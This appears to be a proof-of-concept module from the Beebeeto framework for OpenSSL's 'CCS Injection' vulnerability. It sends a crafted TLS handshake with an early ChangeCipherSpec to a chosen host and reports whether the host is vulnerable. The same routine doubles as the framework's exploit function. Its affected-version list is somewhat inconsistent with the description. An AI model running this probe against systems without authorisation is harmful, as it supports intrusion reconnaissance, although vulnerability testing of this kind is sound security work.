#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import time
import struct
import random
import socket
import select
import urlparse

from baseframe import BaseFrame
from utils.common.str import hex_dump


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0014',  # 由Beebeeto官方编辑
            'name': None,  # 名称
            'author': 'anonymous',  # 作者
            'create_date': '2014-07-16',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'ssl/tls',  # 该漏洞所涉及的协议名称
            'port': [443],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议基于哪个传输层协议(tcp/udp/sctp)
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'openssl',  # 漏洞所涉及的应用名称
            'vul_version': ['<0.9.8y',  # 受漏洞影响的应用版本
                            ['1.0.0', '1.0.0l'],
                            ['1.0.0', '1.0.0g']],
            'type': None,  # 漏洞类型
            'tag': ['openssl', 'man in middle'],  # 漏洞相关Tag
            'desc': '''
                    OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not
                    properly restrict processing of ChangeCipherSpec messages,which allows man-in-the-middle
                    attackers to trigger use of a zero-length master key in certain OpenSSL-to-OpenSSL
                    communications, and consequently hijack sessions or obtain sensitive information,
                    via a crafted TLS handshake, aka the "CCS Injection" vulnerability.
                    ''',  # 漏洞描述
            'references': ['https://portal.nsfocus.com/vulnerability/list/',
                           'http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html',
                           'https://gist.github.com/rcvalle/71f4b027d61a78c42607',
                           ],  # 参考链接
        },
    }

    def _init_user_parser(self):
        self.user_parser.add_option('--msgtype', dest='msg_type', action='store', type='int', default=1,
                                    help='define the 11th bype data of the handshake message. '
                                         'The optional values are "0", "1", "2" or "3"')
        self.user_parser.add_option('-p', '--port',
                                    dest='port', action='store', type='int', default=443,
                                    help='host port.')

    handshake_message = "" \
        "\x16" \
        "\x03\x01" \
        "\x00\x9a" \
        "\x01" \
        "\x00\x00\x96" \
        "\x03\x01" \
        "\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00" \
        "\x00\x68" \
        "\xc0\x14" \
        "\xc0\x13" \
        "\xc0\x12" \
        "\xc0\x11" \
        "\xc0\x10" \
        "\xc0\x0f" \
        "\xc0\x0e" \
        "\xc0\x0d" \
        "\xc0\x0c" \
        "\xc0\x0b" \
        "\xc0\x0a" \
        "\xc0\x09" \
        "\xc0\x08" \
        "\xc0\x07" \
        "\xc0\x06" \
        "\xc0\x05" \
        "\xc0\x04" \
        "\xc0\x03" \
        "\xc0\x02" \
        "\xc0\x01" \
        "\x00\x39" \
        "\x00\x38" \
        "\x00\x37" \
        "\x00\x36" \
        "\x00\x35" \
        "\x00\x33" \
        "\x00\x32" \
        "\x00\x31" \
        "\x00\x30" \
        "\x00\x2f" \
        "\x00\x16" \
        "\x00\x15" \
        "\x00\x14" \
        "\x00\x13" \
        "\x00\x12" \
        "\x00\x11" \
        "\x00\x10" \
        "\x00\x0f" \
        "\x00\x0e" \
        "\x00\x0d" \
        "\x00\x0c" \
        "\x00\x0b" \
        "\x00\x0a" \
        "\x00\x09" \
        "\x00\x08" \
        "\x00\x07" \
        "\x00\x06" \
        "\x00\x05" \
        "\x00\x04" \
        "\x00\x03" \
        "\x00\x02" \
        "\x00\x01" \
        "\x01" \
        "\x00" \
        "\x00\x05" \
        "\x00\x0f" \
        "\x00\x01" \
        "\x01"

    ccs_message = "" \
        "\x14" \
        "\x03\x01" \
        "\x00\x01" \
        "\x01"


    @staticmethod
    def modify_str(str1, index, value):
        return str1[:index] + value + str1[index + 1:]

    @classmethod
    def verify(cls, args):
        options = args['options']
        if options['msg_type'] == 1:
            handshake_message = cls.modify_str(cls.handshake_message, 10, '\x02')
        elif options['msg_type'] == 2:
            handshake_message = cls.modify_str(cls.handshake_message, 10, '\x03')
        elif options['msg_type'] == 3:
            handshake_message = cls.modify_str(cls.handshake_message, 2, '\x00')
            handshake_message = cls.modify_str(handshake_message, 10, '\x00')

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s.settimeout(5)

        if options['target'].startswith('https://') or options['target'].startswith('http://'):
            host = urlparse.urlparse(options['target']).netloc
        else:
            host = options['target']
        ip = socket.gethostbyname(host)
        s.connect((host, options['port']))

        if options['verbose']:
            print "connected to %s:%d\n\n" % (host, options['port'])

        handshake_message = handshake_message[:11] + \
            struct.pack('!I', int(time.time())) + \
            handshake_message[15:]

        for i in xrange(28):
            handshake_message = cls.modify_str(handshake_message,
                                              15 + i,
                                              struct.pack("B", random.randint(0, 255) & 0xff))

        s.send(handshake_message)

        if options['verbose']:
            print hex_dump(handshake_message)
            print "%d bytes sent\n\n" % len(handshake_message)

        rlists = [s]
        wlists = []
        buf_size = 16384
        ccs_sent = 0

        while True:
            rs, ws, es = select.select(rlists, wlists, rlists, 10)
            if not(rs or ws or es):
                if options['verbose']:
                    print '\ntimeout...'
                args['poc_ret'] = 'timeout'
                args['success'] = False
                return args

            buf = s.recv(buf_size)
            if options['verbose']:
                print hex_dump(buf)
                print "%d bytes received\n\n" % len(buf)

            if ccs_sent:
                for i in xrange(len(buf)):
                    if ( buf[i] == '\x15' and  # alert
                         buf[i + 1] == '\x03' and
                         buf[i + 5] == '\x02'):  # fatal
                        if (buf[i + 6] == '\x0a'):  # unexpected_message
                            if options['verbose']:
                                print "%s: Not Vulnerable\n" % host
                            args['success'] = False
                            return args
                        else:
                            break
                break
            else:
                for i in xrange(len(buf)):
                    if ( buf[i] == '\x16' and  # handshake
                         buf[i + 1] == '\x03' and
                         buf[i + 5] == '\x02' and  # server_hello
                         buf[i + 9] == '\x03'):
                        ccs_message = cls.modify_str(cls.ccs_message, 2, buf[i + 10])  # Use the protocol version sent by the server.

                    if ( buf[i] == '\x16' and  # handshake
                         buf[i + 1] == '\x03' and
                         buf[i + 3] == '\x00' and
                         buf[i + 4] == '\x04' and
                         buf[i + 5] == '\x0e' and  # server_hello_done
                         buf[i + 6] == '\x00' and
                         buf[i + 7] == '\x00' and
                         buf[i + 8] == '\x00'):
                        # Send the change cipher spec message twice to force
                        # an alert in the case the server is not patched.
                        s.send(ccs_message)
                        if options['verbose']:
                            print hex_dump(ccs_message)
                            print "%d bytes sent\n\n" % len(ccs_message)

                        s.send(ccs_message)
                        if options['verbose']:
                            print hex_dump(ccs_message)
                            print "%d bytes sent\n\n" % len(ccs_message)

                        ccs_sent += 1

        if options['verbose']:
            print "%s\n%s\nVulnerable\n" % (options['target'], host)

        args['success'] = True
        return args

    exploit = verify  # the poc fuction and exp fuction are the same


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
